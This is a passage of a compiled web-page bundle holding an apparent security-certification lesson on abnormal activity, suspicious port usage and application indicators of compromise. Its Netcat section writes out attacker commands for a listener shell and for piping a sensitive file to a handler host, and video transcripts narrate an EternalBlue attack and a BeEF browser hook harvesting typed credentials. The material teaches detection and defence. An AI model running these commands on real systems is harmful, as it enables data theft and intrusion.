https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3"),e("span",{class:"centered"}," created by egre55"),i(" . ")])])])])],-1),a('<p>Reverse shell commands are unlikely to represent normal activity. Any indication that one of the reverse shell commands has been used indicates suspicious activity and potential unauthorized access (potential because the reverse shell may not have worked to establish a shell).</p><p>The other commands listed for Windows, PowerShell, and Linux warrant further investigation, as an engineer or administrator may have used them to troubleshoot a problem, reconfigure a service, obtain remote access for legitimate purposes, or complete a change request. The objective is to determine what scenario sufficiently explains why the commands were used. Even if an authorized employee used the commands, the reason they were used may not be justified and could indicate malicious intent or a failure to follow established protocol.</p><h3 id="_8-3-9-suspicious-protocol-and-port-usage" tabindex="-1"><a class="header-anchor" href="#_8-3-9-suspicious-protocol-and-port-usage"><span>8.3.9 Suspicious Protocol and Port Usage</span></a></h3><p>Click one of the buttons to take you to that part of the video.</p><p>Suspicious Protocol and Port Usage 00:00-00:25 In a typical network, most traffic should be flowing between the clients and servers. This traffic should be using standard ports and protocols. Any unusual traffic should be immediately investigated as this can be a sign of a potential threat. In this lesson, we&#39;ll go over how to identify suspicious traffic based on the ports and protocols being used. We&#39;ll then wrap up with some ways we can mitigate this type of non-standard traffic.</p><p>Identifying Suspicious Traffic 00:25-02:12 One of the key components of keeping our networks safe is constant monitoring of the traffic coming in and going out of the network. Any traffic that seems out of the ordinary, especially at unusual times of day, should be investigated immediately. One way to identify irregular traffic patterns is to monitor what ports are being used.</p><p>You can think of ports as the doors into a computer system. Different types of traffic use a specific numbered door to enter and exit the computer. The Internet Assigned Numbers Authority, or IANA, has established a list of TCP and UPD port mappings that define which port should be used for specific types of traffic. For example, port 80 is reserved for all HTTP traffic.</p><p>Firewalls and other security appliances look at the packets coming in and can allow or deny the traffic based on the port number and protocol being used.</p><p>Even though we have standard ports, any application can be configured to work on any port as long as another application isn&#39;t already configured to use the same port. Attackers will often try to run their attacks through non-standard ports since these ports aren&#39;t typically monitored very well. If you notice that traffic is moving through one of these ports, it&#39;s a good idea to begin investigating immediately.</p><p>Aside from using non-standard ports, some malware will use standard ports but then send a different protocol through that port. This is known as mismatched port or application traffic. For example, malware may send DNS traffic to communicate with a C&amp;C server through port 80. Because the firewall and network monitoring tools just see legitimate HTTP traffic, it&#39;ll allow the traffic to flow through the network.</p><p>Most network traffic should be between a client and the server. If you notice any irregular peer-to-peer communication, this should be immediately investigated, as it could indicate an ARP spoofing attack, an ARP poisoning attack, or an on-path attack.</p><p>Mitigating Non-Standard Port Traffic 02:12-03:08 The best way to prevent non-standard port traffic is to configure the firewall properly. Since most networks should only have specific types of traffic flowing through them, it&#39;s best to use a whitelist. The whitelist defines which type of traffic is allowed in and out of the network, and anything else is blocked. The main problem with this is that it can cause issues with legitimate programs, so careful planning is needed.</p><p>Some firewalls are able to inspect the packets themselves to verify that they&#39;re legitimate. These firewalls should be used whenever possible to help prevent mismatched ports or application traffic from getting through the firewall.</p><p>When configuring the firewall, you want to make sure that outbound traffic is also monitored and regulated. Attackers will often attempt to install what&#39;s called a reverse shell on the victim machine. The reverse shell causes the victim computer to initiate the connection to the attacker. If the firewall isn&#39;t configured to monitor and block outgoing traffic, then this will allow the attacker access to the network and target machine.</p><p>Summary 03:08-03:32 That&#39;ll wrap up this lesson on suspicious protocol and port usage. In this lesson, we first went over some signs you can use to identify suspicious traffic, including traffic flowing on non-standard ports or mismatched ports, or application traffic. We then looked at ways to mitigate this type of traffic, including properly configuring our inbound and outbound traffic settings on the firewall.</p><h3 id="_8-3-10-suspicious-protocol-and-port-usage-facts" tabindex="-1"><a class="header-anchor" href="#_8-3-10-suspicious-protocol-and-port-usage-facts"><span>8.3.10 Suspicious Protocol and Port Usage Facts</span></a></h3><p>On a typical network, the majority of traffic should flow between the server and clients using standards ports and protocols. Any abnormal traffic should be immediately investigated, as this can be an indicator of compromise (IoC).</p><p>This lesson covers the following topics:</p><ul><li>Irregular peer-to-peer communication</li><li>Common protocol and non-standard port usage</li><li>Mitigate non-standard port usage</li></ul><h4 id="irregular-peer-to-peer-communication" tabindex="-1"><a class="header-anchor" href="#irregular-peer-to-peer-communication"><span>Irregular Peer-to-Peer Communication</span></a></h4><p>Most traffic within an organization occurs between clients and servers. If client devices are communicating with each other, this could be a indicator of compromise. Constant monitoring of network traffic should help identify this abnormal traffic. To further help identify any irregular peer-to-peer communication, a traffic map that shows common traffic flows should be reviewed regularly.</p><p>Any traffic that seems to be out of the ordinary, especially at unusual times of day, should be analyzed. Irregular peer-to-peer communication could indicate an on-path attack, ARP spoofing, or ARP poisoning.</p><h4 id="video" tabindex="-1"><a class="header-anchor" href="#video"><span>Video</span></a></h4><p>Click one of the buttons to take you to that part of the video.</p><p>Irregular Peer-to-Peer Communication Intrusion IoC 00:00-01:17 When you&#39;re talking about things like intrusion indicators of compromise, you need something to listen to those. And in this case, I&#39;ve got a copy of Zeke happening here. I&#39;ve basically sicced tail on the connection log. What we have here is, Zeke takes a really good snapshot of what&#39;s going on in the network.</p><p>And this is a directory that contains the connection log, and it&#39;s an active log that&#39;s being contributed to all the time, as Zeke gets ahold of connections that are being made here. It sends them to the connection log. So there you go, it&#39;s actually happening live here. So this is where Zeke is pretty good at discovering, as long as it&#39;s configured correctly indicators of compromise, in this case, what it&#39;s doing, it&#39;s just picking up some simple UDP traffic here, but what I wanna do is, so that&#39;s my that&#39;s my listener, and I&#39;ve also got another application.</p><p>That&#39;s not a good idea, by any means, but it&#39;s very nice, it visualizes traffic. It&#39;s called EtherApe, it&#39;s a Linux application, and it visualizes traffic, in this case, there&#39;s that unknown UDP packet. So they&#39;re on Zeke, was that unknown UDP packet. Well, this picked up that UDP packet, as well, and I could just show you just to set the stage here.</p><p>Kali Linux Example 01:17-04:48 I&#39;ve got a Kali Linux system here. And what I could do, is bring this up here, and I could show you a particular, I could just set a ping going here. So I&#39;m just doing an innocuous ping to this system here, and you&#39;ll notice, eventually, there&#39;s the Zeke is picking up the ICMP there, eventually, and so, does, there&#39;s the yellow ICMP, you could see it happening there, and if you want, I could even show it even a bit more radically.</p><p>I could actually get this thing to get a ping flood going, which will really, make the numbers change as it were, but just so, yeah, so you see it here, eventually, Zeke picks up on that ICMP, but you can even do something even much more radical, and this is hardly a particular compromise that&#39;s going on here.</p><p>But just to kinda show you where we are, I&#39;ll do a really quick ping flood. So there&#39;s a ping flood there, and let me show you, there is EtherApe, discovering the ping flood, right? You can see those big yellow pieces of traffic that&#39;s showing, look at that. We&#39;re identifying and showing that, major indicator here of some form of attack at any rate.</p><p>But we can do something a little more subtle than something like, a non spoofed ping flood, for heaven&#39;s sake. Let&#39;s take a look and wrap this up just a little bit, and show you something in Cali, and it&#39;s just simply, it&#39;s a pretty simple attack. It is the EternalBlue attack, and I&#39;m gonna attack a Windows system.</p><p>And so, what I&#39;ve done, is I&#39;ve already pre-configured, see if I can bring it up, pre-configured a Windows, particular system. Let&#39;s see if I can clear this and bring this up, so you can see a nice pretty picture. I&#39;ve pre-configured this system, so that it is ready to attack a remote computer.</p><p>And so, let me show the options and its current configuration. These are all the options that are available, and what I&#39;m doing here, is setting up EternalBlue, so that it can go after all of the different systems here. So what I&#39;ve done, is I&#39;ve decided to wage that EternalBlue attack.</p><p>And so, so that we can pick up what those indicators of compromise kind of look like. So here we go, there, it is set. I&#39;ll go ahead and run the attack, and it is going even as we speak. So it is now sending this traffic. I&#39;ve picked a very vulnerable Window 7 system.</p><p>Trust me, they&#39;re still around, and now, it is basically setting up the buffer overflow, it sending the buffer overflow traffic right here, and it says, it&#39;s successful, whether or not it&#39;s successful at this point, doesn&#39;t necessarily matter. But here is what the indicators here are, what the indicators of compromise look like.</p><p>Here are all the TCP connections being made here, and we can show it on EtherApe, there&#39;s a bunch of Microsoft, see where it says Microsoft-DS, that&#39;s a bunch of traffic being generated across the network. So we&#39;re picking it up at a couple of different ways. We&#39;re sniffing it in a couple of different ways, and what we can do now, and I&#39;ll stop, take a look at this.</p><p>What we can do now is take a look at this particular traffic and start drilling down even more into detail, and that basically is showing the indicators of compromise.</p><hr><h4 id="common-protocol-and-non-standard-port-usage" tabindex="-1"><a class="header-anchor" href="#common-protocol-and-non-standard-port-usage"><span>Common Protocol and Non-standard Port Usage</span></a></h4><p>The Internet Assigned Numbers Authority (IANA) maintains a list of well-known (0-1023) and registered (1024-49151) TCP and UDP port mappings. By default, legitimate application servers use these standard ports, such as a secure web server listening on TCP port 443. However, any application can be configured to work on any port, so long as two processes on the same host are not trying to own the same port.</p><p>Malware can easily use a non-standard port for HTTP or DNS C&amp;C traffic or for its own custom transmission mechanism. The corollary of this is that malware might start a service on a local host using a standard port but communicate a different protocol over that port. This is often described as a mismatched port or application traffic IoC.</p><p>Some malware has been known to use certain ports, but unfortunately there&#39;s no definitive or comprehensive list. Malware writers easily adapt and change how their software communicates. Still, certain ranges of ports are more likely to indicate a compromise. The dynamic and private range (49152–65535) can&#39;t be registered with the IANA and is typically used by clients for temporary communication sessions with servers. If an unknown open port in this range appears constant on a host, it may indicate a channel that&#39;s carrying malicious traffic. You can look up suspicious ports on <a href="http://www.speedguide.net/ports.php" target="_blank" rel="noopener noreferrer">speedguide.net/ports.php</a> to see if that port is known to be used for malicious purposes.</p><h5 id="shell-and-reverse-shell" tabindex="-1"><a class="header-anchor" href="#shell-and-reverse-shell"><span>Shell and Reverse Shell</span></a></h5><p>As well as beaconing and data transfer, adversaries will often want to use a Remote Access Tool/Trojan (RAT) to obtain a shell on the compromised system and run commands. A shell is where the attacker opens a listening port that exposes the command prompt on the local host and connects to that port from a remote host.</p><p>A reverse shell is where the attacker opens a listening port on the remote host and causes the infected host to connect to it. Traffic received by the infected host is then redirected to the command prompt. A reverse shell is typically used to exploit organizations that haven&#39;t configured outbound traffic filtering at the firewall.</p><h5 id="netcat" tabindex="-1"><a class="header-anchor" href="#netcat"><span>Netcat</span></a></h5><p>Netcat (nc) is an open-source tool native to Linux and often used by attackers. One common method uses a listener started on a victim system (IP: 10.1.0.1) and set to pipe traffic from a program (such as the command interpreter) or file to the handler. Any arbitrary, unused port will work for the listener, but using registered ports requires administrative access:</p><ul><li><code>nc -lvnp 8080</code></li></ul><p>The following command connects to the listener and grants access to the terminal:</p><ul><li><code>nc 10.1.0.1 8080</code></li></ul><p>Used the other way around, Netcat can receive files. For example, on the target system, the attacker runs the following:</p><ul><li><code>cat sensitive_file.xlsx | nc 10.1.0.249 8181</code></li></ul><p>On the handler (IP 10.1.0.249), the attacker receives the file using the following command:</p><ul><li><code>nc -l -p 8181 &gt; copy_of_file.xlsx</code></li></ul><p>Nmap has produced reimplementations of Netcat called ncat and nc. Cryptcat ( <a href="http://cryptcat.sourceforge.net/" target="_blank" rel="noopener noreferrer">cryptcat.sourceforge.net</a> ) performs a similar function but with the ability to encrypt the channel. Socat ( <a href="http://www.dest-unreach.org/socat/" target="_blank" rel="noopener noreferrer">dest-unreach.org/socat</a> ) is a bidirectional tool and supports better shell functionality, such as keyboard shortcuts and local variables. The open-source Pupy tool ( <a href="https://github.com/n1nj4sec/pupy" target="_blank" rel="noopener noreferrer">github.com/n1nj4sec/pupy</a> ) is being developed as a means of evaluating exposure to post-exploitation techniques.</p><h4 id="mitigate-non-standard-port-usage" tabindex="-1"><a class="header-anchor" href="#mitigate-non-standard-port-usage"><span>Mitigate Non-standard Port Usage</span></a></h4><p>The best way to mitigate the use of non-standard ports is to configure firewalls to allow only whitelisted ports to communicate on ingress and egress interfaces. Unfortunately, this type of policy is difficult to put into practice, as it tends to cause numerous support issues for legitimate applications. Configuration documentation should also show which server ports are allowed on any given host type. This can then be used to create detection rules for non-standard port usage. Detection rules can also be configured to detect mismatched protocol usage over a standard port.</p><h3 id="_8-3-12-application-related-indicators-of-compromise" tabindex="-1"><a class="header-anchor" href="#_8-3-12-application-related-indicators-of-compromise"><span>8.3.12 Application-Related Indicators of Compromise</span></a></h3><p>Click one of the buttons to take you to that part of the video.</p><p>Application-Related Indicators of Compromise 00:00-00:19 In this lesson, we&#39;re going to talk about application-related indicators of compromise. These come from either you monitoring system or a user. You might hear, &quot;It&#39;s just acting weird,&quot; see unusual pop-up windows, or experience slow or unresponsive applications.</p><p>Anomalous Activity 00:19-02:33 If you detect these types of anomalous activity, you&#39;ll want to keep an eye out for new accounts, unexpected output, service interruptions, and unexpected outbound communication.</p><p>Because an attacker is going to want to install information without drawing attention to themselves, they&#39;ll often try to get the most privileges they can on a network through privilege escalation or by accessing domain and admin accounts.</p><p>If you detect the introduction of a new account, you should reset the user account password, log the user off, and then monitor for new login attempts.</p><p>Unexpected pop-up windows and unusual error messages are often indicators of compromise. This is especially true if the user is getting Windows User Access Control pop-ups. These prompts are typically only shown when you install new software, so if this window pops up out of the blue, that&#39;s cause for concern.</p><p>If you notice this type of activity, look for unusual request patterns, scan for code injection strings in HTTP requests and, of course, check for malware on the host.</p><p>Services will also alert you to issues. Any time you have services restarting, crashing, or stopping, you should investigate to determine whether there&#39;s been a security incident or if there&#39;s a maintenance issue that needs to be addressed.</p><p>If you receive information about service interruptions, it&#39;s possible that an authorized process has been compromised by malware. Anti-malware services may be unable to detect suspicious activities. It may have disabled the service, or it may have found a way to operate without detection. Interruptions can also occur because a service has been disabled. For example, if DNS were disabled, the weird behaviors could be evidence of a compromised name resolution.</p><p>Regardless of which other symptoms are present, you&#39;ll almost always find unexpected outbound communication. This communication is not always easy to detect because the attack will appear to be legitimate traffic unless you have an IDS, which can identify it as illegitimate.</p><p>If you detect unexpected outbound communication, enumerate open ports on the host. This can be done using tools like Nmap or netstat. Verify that the port ranges match and review port traffic with a sniffer. You can also check the destination IP address against known malicious IP addresses.</p><p>Application Logs 02:33-03:34 In addition to host-based software applications, network-based software application logs should also be monitored, reviewed, and investigated as needed.</p><p>DNS event logs can notify you of unusual spikes in DNS lookups or DNS lookup failures. They can also help you determine which hosts are communicating with malicious IP addresses. HTTP access logs give information about requests and responses, including any traffic errors. They can also be set to provide you with information about traffic that matches predetermined rules.</p><p>FTP access logs give information about each transaction, including the client and server, usernames, and status codes. Structured Query Language databases can be customized to include many types of alerts and logging capabilities, including information about access attempts, details about individual query strings, and transaction logs that can be used for rollbacks and recovery. Each of these log files are packed with useful information. They&#39;re important resources for any security team.</p><p>Summary 03:34-03:50 That&#39;s it for this lesson. In this video, we discussed application-related indicators of compromise. We reviewed several types of anomalous activities to look out for, and we discussed application logs.</p><h3 id="_8-3-13-application-related-indicators-of-compromise-facts" tabindex="-1"><a class="header-anchor" href="#_8-3-13-application-related-indicators-of-compromise-facts"><span>8.3.13 Application-Related Indicators of Compromise Facts</span></a></h3><p>This lesson covers the following topics:</p><ul><li>Anomalous activity</li><li>Application logs</li><li>Identifying Malicious Activity through Analysis (video)</li></ul><h4 id="anomalous-activity" tabindex="-1"><a class="header-anchor" href="#anomalous-activity"><span>Anomalous Activity</span></a></h4><p>Anomalous activity is an action that deviates from normal actions for the system. Identifying malicious activity via analysis involves analyzing data to detect and prevent cyberattacks, malicious software, or other harmful activities that can damage or infiltrate computer networks and the systems attached to them.</p><p>When dealing with application-related indicators of compromise (IoC), an anomalous application-related activity can include a wide range of activities, from harmless glitches to malicious cyberattacks. Some examples of anomalous activity include hardware failures, software bugs, human error, or cyber-attacks. Anomalous activity may or may not be malicious. It is up to the security analyst to determine the difference.</p><p>The analysis of malicious activity is accomplished using several methods, including network traffic analysis, malware analysis, log monitoring, behavioral analysis, and other methods. Each of these examples aims to detect and identify malicious activity so that security teams can take appropriate action to prevent or mitigate damage.</p><p>It is essential to have a baseline understanding of what constitutes normal behavior to detect anomalous computer activity. Baselines can be established by monitoring system logs, network traffic, and user activity over time and using anomaly detection tools, such as intrusion detection systems (IDS) or security information and event management (SIEM) software.</p><h5 id="introduction-of-new-accounts" tabindex="-1"><a class="header-anchor" href="#introduction-of-new-accounts"><span>Introduction of New Accounts</span></a></h5><p>Introducing new accounts can indicate malicious activity, such as an attempt to gain unauthorized access to a system or network. In many cases, attackers will create accounts to bypass existing security measures, such as passwords or multifactor authentication, or to gain elevated privileges on a system. New accounts are also a common means of establishing a backdoor, which can be used to maintain access or launch further attacks.</p><p>New accounts can also signify insider threats, where an employee or contractor may be attempting to gain access to data or systems they are not authorized to use. Sometimes employees create &quot;ghost&quot; accounts to obfuscate their activity and hide their primary user account from being listed on activity reports.</p><p>It is important to note, however, that introducing new accounts is not necessarily suspicious, as creating accounts is necessary for new employees and contractors. It is essential to consider the context in which new accounts are introduced to determine whether they are suspicious.</p><p>If you detect this activity, do the following:</p><ul><li>Reset the user account password</li><li>Log the user off</li><li>Monitor for login attempts</li></ul><h5 id="unexpected-output" tabindex="-1"><a class="header-anchor" href="#unexpected-output"><span>Unexpected Output</span></a></h5><p>Unexpected pop-up windows and unusual error messages are often indicators of compromise. This is especially true if the message is a Windows user access control (UAC) pop-up. UAC messages typically show up only when installing or changing software. If the UAC message or other unexpected output displays without action by the user, do the following.</p><ul><li>Look for unusual request patterns.</li><li>Scan for code injection strings in HTTP requests.</li><li>Sweep for malware on the host.</li></ul><p>Unexpected output can include the appearance of unknown files or processes on a system, which may indicate malware or an attacker with access to a system.</p><h5 id="service-interruptions" tabindex="-1"><a class="header-anchor" href="#service-interruptions"><span>Service Interruptions</span></a></h5><p>Service interruption can signify malicious activity, as it may indicate that an attacker has successfully compromised a system or network and is attempting to disrupt normal operations or deny access to critical resources. Some reasons why service interruption is a sign of malicious activity include the following:</p><table><thead><tr><th>Interruption</th><th>Description</th></tr></thead><tbody><tr><td>Denial-of-service (DoS) attack</td><td> Attackers may carry out DoS attacks to overwhelm a system or network with traffic or requests, rendering it unable to function correctly. </td></tr><tr><td>Ransomware infection</td><td> Ransomware typically causes significant disruption to business operations and loss of data. </td></tr><tr><td>Exploiting vulnerabilities</td><td> When attackers exploit systems, it often causes services and applications to crash. Investigate anytime that a service restarts, crashes, or stops. Attackers will often disable services to operate without detection. </td></tr><tr><td>Insider threats</td><td> Insider threats, such as employees or contractors with authorized access to systems, may intentionally or unintentionally cause service interruptions by misconfiguring systems, mishandling data, making mistakes, introducing malware, or performing actions or accessing data they should not be able to do. </td></tr><tr><td>Abnormal resource utilization</td><td> Abnormal resource utilization can include unusually high CPU or memory usage, which may be caused by malware, password attacks, resource-intensive applications, or hardware failures. </td></tr></tbody></table><h5 id="unexpected-outbound-communication" tabindex="-1"><a class="header-anchor" href="#unexpected-outbound-communication"><span>Unexpected Outbound Communication</span></a></h5><p>Regardless of other symptoms that are present, you will almost always find attempted outbound communication. Unexpected outbound communications can indicate that an attacker has successfully compromised a system and is attempting to exfiltrate data, establish a backdoor, obtain secondary infectors, or communicate with a C&amp;C system. This communication is not always easy to detect because the attack will appear to be legitimate traffic.</p><p>An intrusion detection system (IDS) is typically needed to detect this type of traffic. If you suspect this type of activity:</p><ul><li>Enumerate open ports on the host. This can be done using nmap or netstat.</li><li>Verify that the port ranges match.</li><li>Review port traffic with a sniffer to ensure the traffic is what it is supposed to be.</li><li>Check destination IP addresses against known malicious IP addresses.</li></ul><p>Some examples of unexpected output include the following:</p><table><thead><tr><th>Event</th><th>Description</th></tr></thead><tbody><tr><td>Unusual network traffic</td><td> This can include unexpected spikes in network activity, communication with unfamiliar IP addresses, or unusual data flow patterns, which may indicate data exfiltration or command and control (C2) activity. </td></tr><tr><td>Unexpected communication</td><td> This can include unexpected communication between applications and systems, which may indicate attempts to exploit vulnerabilities, establish a C2 channel, or exfiltrate data. </td></tr><tr><td>Communication with suspicious IP addresses</td><td> This can include communication with IP addresses known to be associated with malware, phishing campaigns, or other cyberattacks. </td></tr><tr><td>Unusual communication protocols</td><td> This can include unusual communication protocols not typically used in the environment, which may indicate attempts to bypass security measures or establish a C2 channel. </td></tr><tr><td>Large data transfers</td><td> This can include the transfer of large amounts of data to external IP addresses, which may indicate data exfiltration or the theft of sensitive data. </td></tr><tr><td>Communication during unusual times</td><td> This can include communication during unusual hours or outside of normal business hours, which may indicate attempts to evade detection. </td></tr><tr><td>Communication with suspicious domains</td><td> This can include contact with domains that are known to be associated with phishing campaigns, cyberattacks, or domains that have been recently registered. </td></tr><tr><td>Encrypted communication</td><td> This can include encrypted or obfuscated communication, which may indicate attempts to hide malicious activity from security personnel. </td></tr></tbody></table><h4 id="application-logs" tabindex="-1"><a class="header-anchor" href="#application-logs"><span>Application Logs</span></a></h4><p>In addition to host-based software applications, you should monitor, review, and investigate network-based software application logs as needed. Application logs can be a valuable source of information for identifying suspicious activity, as they record detailed information about the behavior of applications and users on a system or network.</p><table><thead><tr><th>Information</th><th>Description</th></tr></thead><tbody><tr><td>Monitoring for unusual or unauthorized access</td><td> Application logs document unauthorized access attempts and unusual activity patterns. For example, a log may show repeated login attempts from an unfamiliar IP address or user account, indicating a potential credential stuffing or brute-force attack. </td></tr><tr><td>Tracking changes to application settings or configurations</td><td> Application logs track changes to settings, which may indicate an attacker attempting to gain persistence or establish a backdoor. </td></tr><tr><td>Detecting anomalies in application behavior</td><td> Application logs detect anomalies in application behavior, such as unexpected data inputs or unusual data flows, which may indicate attempts to exploit vulnerabilities or bypass security measures. </td></tr><tr><td>Identifying the source of security incidents</td><td> Application logs can identify the source of security incidents, such as a malware infection or a phishing attack, by tracking the source of the initial access or communication. </td></tr><tr><td>Auditing user behavior</td><td> Application logs store user activity data, such as changes to permissions, access attempts, authentication activity, and many actions to identify potential malicious activity. </td></tr></tbody></table><p>The following table lists additional logs you should consider monitoring for user and application behavior.</p><table><thead><tr><th>Log Type</th><th>Description</th></tr></thead><tbody><tr><td>DNS event logs</td><td> DNS event logs include: <ul><li>DNS queries made by a host.</li><li>Spikes in DNS lookups or DNS lookup failures.</li><li> Information about computers communicating with malicious IP addresses. </li></ul></td></tr><tr><td>HTTP access logs</td><td> HTTP access logs include: <ul><li>HTTP traffic errors.</li><li>Traffic matching a pre-determined rule.</li><li>Response status codes.</li><li>Header information for requests and responses.</li></ul></td></tr><tr><td>FTP access logs</td><td> FTP access logs include the following information for each transaction: <ul><li>Client and server</li><li>Usernames</li><li>Status codes</li><li>Bytes transferred</li></ul></td></tr><tr><td>SQL event logs</td><td> Structured Query Language (SQL) databases can be customized to include many types of alerts and logging capabilities, including: <ul><li>Access attempts.</li><li> Individual query strings such as date, time, user, type of operation, operation schema, and the object of the query. </li><li>Transaction logs (used for rollbacks and recovery).</li></ul></td></tr></tbody></table><h4 id="identifying-malicious-activity-through-analysis-video" tabindex="-1"><a class="header-anchor" href="#identifying-malicious-activity-through-analysis-video"><span>Identifying Malicious Activity through Analysis (Video)</span></a></h4><p>Analysis can help identify malicious activity by looking for patterns and anomalies that point to suspicious behavior. This video demonstrates browser exploitation.</p><h4 id="video-1" tabindex="-1"><a class="header-anchor" href="#video-1"><span>Video</span></a></h4><p>Click one of the buttons to take you to that part of the video.</p><p>Browser Exploitation 00:00-03:59 James Stanger: Want to see the ugliest web page in the world? Well here it is. It&#39;s called the Butcher. It is basically a demonstration site for something called the Browser Exploitation Framework application called BEEF. This here is the BEEF Butcher and what it is, it&#39;s basically called the Hook page.</p><p>Now apparently, ostensibly, it&#39;s simply something that allows you to order a bunch of food. In this case, a bunch of meat here. And you can fill in information here. My second kid would love this. He could order all the, all the beef that he wants.</p><p>So, but really what this is, is a page that is run by the Browser Exploitation Framework application and I&#39;ve logged into the application here and you can see that I have hooked a browser. This browser that I&#39;ve hooked is in fact over here. There it is. On a separate Linux system here.</p><p>And so what I can do here is type in, I&#39;ll type in something here. I&#39;ll type in Jimmy Page for example. For all you Led Zeppelin fans out there and I&#39;ve no idea what his phone number is [COUGHS] so I&#39;ll just say it&#39;s +44 and I&#39;ll type in a few numbers there and I&#39;ll say London, England. And the credit card. Always fun to get credit card information I suppose if you&#39;re a hacker.</p><p>So I will type in this random information. Take a look at what I&#39;ve typed in here. Okay. And I don&#39;t even have to click BUY here, because let me show you real quick and let&#39;s see J Page at-- let&#39;s say he works at CompTIA and a password. Always fun stuff. Lots of credential information that we&#39;re harvesting here. And I&#39;ll just do a password one, two, three like what most people still use.</p><p>Well, because I&#39;ve hooked that browser. Let me show you real quick. I&#39;m gonna go over to my Kali Linux system here and I&#39;m going to check out the logs here and see what I can find. Well looky there. I have discovered. Look there&#39;s JPAGE right. There&#39;s London, England. There&#39;s his credit card information.</p><p>What I&#39;ve done here is a classic hook using some JAVA script, using some bad XML. And I&#39;ve gotten a hold of this particular browser and I kind of own it. I am key logging effectively. But I can do more than that using the Browser Exploitation Framework. I can actually issue commands if I want to. I can upload code here. I can conduct social engineering and various other things using the Browser Exploitation Framework. It&#39;s just a fairly simple example of if you can get an End User to go to that web page and actually start entering information, they don&#39;t even have to click SEND.</p><p>So you&#39;re not worrying about posting or getting right now. You&#39;re just key logging in this case. So it&#39;s just a fairly simple example. Of course, a good hacker, a good pen tester, a good security analyst would create a page that&#39;s much convincing than this. But nevertheless, it&#39;s pretty cool. Now, most of your modern web browsers will-- I shouldn&#39;t say web browsers, most of your modern endpoints will capture and notice this.</p><p>So notice here, Sophos is on this particular system. It said hey, there&#39;s something goofy going on here. Okay. The hook.js is making an improper connection and it won&#39;t let me connect. But nevertheless, if you&#39;re able to create an application like this, like the BEEF browser, that&#39;s a bit more current, a bit more sophisticated and trust me, people can, they can conduct various types of attacks. From XML based attacks to a cross browser frame, cross browser attacks and also SQL Injection.</p>',118)]))}const g=o(u,[["render",m],["__file","8.3.html.vue"]]),b=JSON.parse('{"path":"/8.3.html","title":"8.3 Exploring Abnormal Activity","lang":"zh-CN","frontmatter":{"lang":"zh-CN","title":"8.3 Exploring Abnormal Activity","description":"some description"},"headers":[{"level":2,"title":"Section 8.3 Exploring Abnormal Activity","slug":"section-8-3-exploring-abnormal-activity","link":"#section-8-3-exploring-abnormal-activity","children":[{"level":3,"title":"8.3.1 Abnormal Activity","slug":"_8-3-1-abnormal-activity","link":"#_8-3-1-abnormal-activity","children":[]},{"level":3,"title":"8.3.2 Abnormal Activity Facts","slug":"_8-3-2-abnormal-activity-facts","link":"#_8-3-2-abnormal-activity-facts","children":[]},{"level":3,"title":"8.3.3 Endpoint Detection and Response","slug":"_8-3-3-endpoint-detection-and-response","link":"#_8-3-3-endpoint-detection-and-response","children":[]},{"level":3,"title":"8.3.4 Endpoint Detection and Response Facts","slug":"_8-3-4-endpoint-detection-and-response-facts","link":"#_8-3-4-endpoint-detection-and-response-facts","children":[]},{"level":3,"title":"8.3.7 Identifying Malicious Activity","slug":"_8-3-7-identifying-malicious-activity","link":"#_8-3-7-identifying-malicious-activity","children":[]},{"level":3,"title":"Confirming the Findings","slug":"confirming-the-findings","link":"#confirming-the-findings","children":[]},{"level":3,"title":"8.3.8 Interpreting Suspicious Commands Facts","slug":"_8-3-8-interpreting-suspicious-commands-facts","link":"#_8-3-8-interpreting-suspicious-commands-facts","children":[]},{"level":3,"title":"8.3.9 Suspicious Protocol and Port Usage","slug":"_8-3-9-suspicious-protocol-and-port-usage","link":"#_8-3-9-suspicious-protocol-and-port-usage","children":[]},{"level":3,"title":"8.3.10 Suspicious Protocol and Port Usage Facts","slug":"_8-3-10-suspicious-protocol-and-port-usage-facts","link":"#_8-3-10-suspicious-protocol-and-port-usage-facts","children":[]},{"level":3,"title":"8.3.12 Application-Related Indicators of Compromise","slug":"_8-3-12-application-related-indicators-of-compromise","link":"#_8-3-12-application-related-indicators-of-compromise","children":[]},{"level":3,"title":"8.3.13 Application-Related Indicators of Compromise Facts","slug":"_8-3-13-application-related-indicators-of-compromise-facts","link":"#_8-3-13-application-related-indicators-of-compromise-facts","children":[]}]}],"git":{"updatedTime":1747590060000},"filePathRelative":"8.3.md"}');export{g as comp,b as data};
